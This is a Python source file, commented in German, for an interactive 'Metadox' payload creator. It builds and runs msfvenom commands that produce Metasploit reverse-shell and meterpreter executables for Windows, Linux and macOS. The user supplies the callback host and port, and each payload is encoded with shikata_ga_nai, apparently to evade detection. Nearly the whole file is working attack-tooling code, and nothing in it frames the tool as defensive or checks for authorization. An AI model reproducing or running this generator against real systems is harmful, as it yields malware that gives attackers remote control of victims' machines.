#!/usr/bin/env python3
"""
Payload Creator für Metadox
Erstellt Metasploit-Payloads für verschiedene Betriebssysteme
"""

import os
import sys
import subprocess
import socket
import json
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import time
from color_utils import Colors, ColorPrinter


class PayloadCreator:
    """Klasse zur Erstellung von Metasploit-Payloads"""
    
    def __init__(self, system_detector):
        self.system_detector = system_detector

        # Verwende das lokale payloads-Verzeichnis im Projekt
        project_root = os.path.dirname(os.path.dirname(__file__))
        self.payloads_dir = os.path.join(project_root, "payloads")
        self.config_file = os.path.expanduser("~/.metadox/payload_config.json")
        self.payload_config = self._load_payload_config()
        self.printer = ColorPrinter()
        
        # Erstelle Payload-Verzeichnisse
        os.makedirs(self.payloads_dir, exist_ok=True)
        os.makedirs(os.path.join(self.payloads_dir, "windows"), exist_ok=True)
        os.makedirs(os.path.join(self.payloads_dir, "linux"), exist_ok=True)
        os.makedirs(os.path.join(self.payloads_dir, "macos"), exist_ok=True)
    
    def _load_payload_config(self) -> Dict:
        """Lädt die Payload-Konfiguration"""
        default_config = {
            "default_lhost": self._get_local_ip(),
            "default_lport": 4444,
            "default_encoder": "x86/shikata_ga_nai",
            "default_format": "exe",
            "payloads": {
                "windows": {
                    "meterpreter_reverse_tcp": "windows/meterpreter/reverse_tcp",
                    "meterpreter_reverse_http": "windows/meterpreter/reverse_http",
                    "meterpreter_reverse_https": "windows/meterpreter/reverse_https",
                    "shell_reverse_tcp": "windows/shell/reverse_tcp",
                    "powershell_reverse_tcp": "windows/powershell_reverse_tcp"
                },
                "linux": {
                    "meterpreter_reverse_tcp": "linux/x86/meterpreter/reverse_tcp",
                    "meterpreter_reverse_http": "linux/x86/meterpreter/reverse_http",
                    "shell_reverse_tcp": "linux/x86/shell/reverse_tcp",
                    "meterpreter_x64_reverse_tcp": "linux/x64/meterpreter/reverse_tcp"
                },
                "macos": {
                    "meterpreter_reverse_tcp": "osx/x86/shell_reverse_tcp",
                    "meterpreter_x64_reverse_tcp": "osx/x64/meterpreter/reverse_tcp"
                }
            }
        }
        
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    default_config.update(config)
            except Exception as e:
                print(f"⚠️  Fehler beim Laden der Payload-Konfiguration: {e}")
        
        return default_config
    
    def _save_payload_config(self):
        """Speichert die Payload-Konfiguration"""
        with open(self.config_file, 'w') as f:
            json.dump(self.payload_config, f, indent=2)
    
    def _get_local_ip(self) -> str:
        """Ermittelt die lokale IP-Adresse automatisch"""
        try:
            # Methode 1: Verbinde zu einem Remote-Server um die lokale IP zu ermitteln
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Prüfe ob es eine gültige externe IP ist (nicht localhost)
            if local_ip and local_ip != "127.0.0.1" and not local_ip.startswith("169.254"):
                return local_ip
        except Exception:
            pass
        
        try:
            # Methode 2: Versuche über Hostname
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            if local_ip and local_ip != "127.0.0.1":
                return local_ip
        except Exception:
            pass
        
        try:
            # Methode 3: Netzwerk-Interfaces durchsuchen
            import subprocess
            if self.system_detector.is_linux():
                # Linux: ip route
                result = subprocess.run(['ip', 'route', 'get', '8.8.8.8'], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'src' in line:
                            parts = line.split()
                            for i, part in enumerate(parts):
                                if part == 'src' and i + 1 < len(parts):
                                    ip = parts[i + 1]
                                    if ip and ip != "127.0.0.1" and not ip.startswith("169.254"):
                                        return ip
            elif self.system_detector.is_windows():
                # Windows: ipconfig
                result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for i, line in enumerate(lines):
                        if 'IPv4' in line and ':' in line:
                            ip = line.split(':')[-1].strip()
                            if ip and ip != "127.0.0.1" and not ip.startswith("169.254"):
                                return ip
        except Exception:
            pass
        
        # Fallback: localhost
        return "127.0.0.1"
    
    def _is_valid_ip(self, ip: str) -> bool:
        """Validiert eine IP-Adresse"""
        try:
            import ipaddress
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def _get_available_payloads(self, target_os: str) -> List[str]:
        """Gibt verfügbare Payloads für das Ziel-Betriebssystem zurück"""
        return list(self.payload_config["payloads"].get(target_os, {}).keys())
    
    def _show_payload_menu(self, target_os: str):
        """Zeigt das Payload-Auswahlmenü"""
        self.printer.print_menu_header(f"PAYLOAD AUSWAHL FÜR {target_os.upper()}", Colors.LIGHT_MAGENTA)
        
        payloads = self._get_available_payloads(target_os)
        
        for i, payload in enumerate(payloads, 1):
            payload_name = self.payload_config["payloads"][target_os][payload]
            self.printer.print_menu_item(str(i), f"{payload} ({payload_name})", Colors.WHITE)
        
        self.printer.print_menu_item(str(len(payloads) + 1), "🔙 Zurück", Colors.LIGHT_RED)
        self.printer.print_separator("=", Colors.MAGENTA, 50)
    
    def _get_payload_config(self, target_os: str, payload_name: str) -> Dict:
        """Sammelt Payload-Konfiguration vom Benutzer"""
        print(f"\n⚙️  KONFIGURATION FÜR {payload_name.upper()}")
        print("=" * 50)
        
        # LHOST (Local Host) - Automatische Erkennung
        detected_ip = self._get_local_ip()
        print(f"🌐 Automatisch erkannte IP: {detected_ip}")
        print(f"💡 Tipp: Drücken Sie Enter um die erkannte IP zu verwenden")
        lhost = input(f"LHOST [{detected_ip}]: ").strip() or detected_ip
        
        # Validiere IP-Adresse
        if not self._is_valid_ip(lhost):
            print(f"⚠️  Warnung: '{lhost}' ist möglicherweise keine gültige IP-Adresse")
            confirm = input("Trotzdem verwenden? (j/n): ").strip().lower()
            if confirm not in ['j', 'ja', 'y', 'yes']:
                lhost = detected_ip
                print(f"✅ Verwende erkannte IP: {lhost}")
        
        # LPORT (Local Port)
        default_lport = self.payload_config["default_lport"]
        print(f"🔌 Lokaler Port (Standard: {default_lport})")
        lport = input(f"LPORT [{default_lport}]: ").strip() or str(default_lport)
        
        # Encoder
        default_encoder = self.payload_config["default_encoder"]
        print(f"🔐 Encoder (Standard: {default_encoder})")
        encoder = input(f"Encoder [{default_encoder}]: ").strip() or default_encoder
        
        # Format
        if target_os == "windows":
            default_format = "exe"
        elif target_os == "linux":
            default_format = "elf"
        elif target_os == "macos":
            default_format = "macho"
        else:
            default_format = "exe"
        
        print(f"📦 Ausgabeformat (Standard: {default_format})")
        format_type = input(f"Format [{default_format}]: ").strip() or default_format
        
        # Dateiname
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        default_filename = f"{payload_name}_{timestamp}.{format_type}"
        print(f"📁 Dateiname (Standard: {default_filename})")
        filename = input(f"Dateiname [{default_filename}]: ").strip() or default_filename
        
        return {
            "lhost": lhost,
            "lport": lport,
            "encoder": encoder,
            "format": format_type,
            "filename": filename,
            "payload": self.payload_config["payloads"][target_os][payload_name]
        }
    
    def _create_payload(self, config: Dict) -> bool:
        """Erstellt den Payload mit msfvenom"""
        print(f"\n🚀 ERSTELLE PAYLOAD...")
        print("=" * 50)
        
        # Bestimme Ausgabepfad
        if config["format"] in ["exe", "dll"]:
            output_dir = os.path.join(self.payloads_dir, "windows")
        elif config["format"] in ["elf", "so"]:
            output_dir = os.path.join(self.payloads_dir, "linux")
        elif config["format"] in ["macho", "app"]:
            output_dir = os.path.join(self.payloads_dir, "macos")
        else:
            output_dir = self.payloads_dir
        
        output_path = os.path.join(output_dir, config["filename"])
        
        # msfvenom Kommando zusammenstellen
        cmd = [
            "msfvenom",
            "-p", config["payload"],
            "LHOST=" + config["lhost"],
            "LPORT=" + config["lport"],
            "-e", config["encoder"],
            "-f", config["format"],
            "-o", output_path
        ]
        
        print(f"🔄 Führe aus: {' '.join(cmd)}")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                print(f"✅ Payload erfolgreich erstellt!")
                print(f"📁 Speicherort: {output_path}")
                print(f"📊 Dateigröße: {os.path.getsize(output_path)} Bytes")
                
                # Speichere Konfiguration
                self._save_payload_info(config, output_path)
                
                return True
            else:
                print(f"❌ Fehler bei Payload-Erstellung!")
                print(f"Error: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            print("⏰ Timeout bei Payload-Erstellung")
            return False
        except Exception as e:
            print(f"❌ Unerwarteter Fehler: {e}")
            return False
    
    def _save_payload_info(self, config: Dict, output_path: str):
        """Speichert Payload-Informationen"""
        info_file = output_path + ".info"
        payload_info = {
            "created_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            "config": config,
            "output_path": output_path,
            "file_size": os.path.getsize(output_path)
        }
        
        with open(info_file, 'w') as f:
            json.dump(payload_info, f, indent=2)
    
    def _list_created_payloads(self):
        """Listet erstellte Payloads auf"""
        print("\n📋 ERSTELLTE PAYLOADS")
        print("=" * 50)
        
        for os_type in ["windows", "linux", "macos"]:
            os_dir = os.path.join(self.payloads_dir, os_type)
            if os.path.exists(os_dir):
                files = [f for f in os.listdir(os_dir) if not f.endswith('.info')]
                if files:
                    print(f"\n🖥️  {os_type.upper()}:")
                    for file in files:
                        file_path = os.path.join(os_dir, file)
                        size = os.path.getsize(file_path)
                        print(f"  📄 {file} ({size} Bytes)")
    
    def create_payload_interactive(self):
        """Interaktive Payload-Erstellung"""
        while True:
            self.printer.print_menu_header("PAYLOAD CREATOR", Colors.LIGHT_MAGENTA)
            
            self.printer.print_menu_item("1", "🪟 Windows Payload erstellen", Colors.LIGHT_BLUE)
            self.printer.print_menu_item("2", "🐧 Linux Payload erstellen", Colors.LIGHT_GREEN)
            self.printer.print_menu_item("3", "🍎 macOS Payload erstellen", Colors.LIGHT_CYAN)
            self.printer.print_menu_item("4", "📋 Erstellte Payloads anzeigen", Colors.LIGHT_YELLOW)
            self.printer.print_menu_item("5", "🔙 Zurück", Colors.LIGHT_RED)
            
            self.printer.print_separator("=", Colors.MAGENTA, 50)
            
            choice = input("🎯 Wählen Sie eine Option (1-5): ").strip()
            
            if choice == '1':
                self._create_payload_for_os("windows")
            elif choice == '2':
                self._create_payload_for_os("linux")
            elif choice == '3':
                self._create_payload_for_os("macos")
            elif choice == '4':
                self._list_created_payloads()
            elif choice == '5':
                break
            else:
                print("❌ Ungültige Auswahl!")
    
    def _create_payload_for_os(self, target_os: str):
        """Erstellt Payload für spezifisches Betriebssystem"""
        while True:
            self._show_payload_menu(target_os)
            payloads = self._get_available_payloads(target_os)
            
            try:
                choice = int(input(f"🎯 Wählen Sie einen Payload (1-{len(payloads) + 1}): "))
                
                if choice == len(payloads) + 1:
                    break
                elif 1 <= choice <= len(payloads):
                    payload_name = payloads[choice - 1]
                    config = self._get_payload_config(target_os, payload_name)
                    
                    print(f"\n📋 PAYLOAD KONFIGURATION")
                    print("=" * 50)
                    for key, value in config.items():
                        print(f"{key.upper()}: {value}")
                    
                    confirm = input("\n✅ Payload erstellen? (j/n): ").strip().lower()
                    if confirm in ['j', 'ja', 'y', 'yes']:
                        if self._create_payload(config):
                            print("\n🎉 Payload erfolgreich erstellt!")
                        else:
                            print("\n❌ Payload-Erstellung fehlgeschlagen!")
                    break
                else:
                    print("❌ Ungültige Auswahl!")
            except ValueError:
                print("❌ Bitte geben Sie eine gültige Zahl ein!")


def main():
    """Test-Funktion"""
    from system_detector import SystemDetector
    
    detector = SystemDetector()
    detector.detect_system()
    
    creator = PayloadCreator(detector)
    creator.create_payload_interactive()


if __name__ == "__main__":
    main()
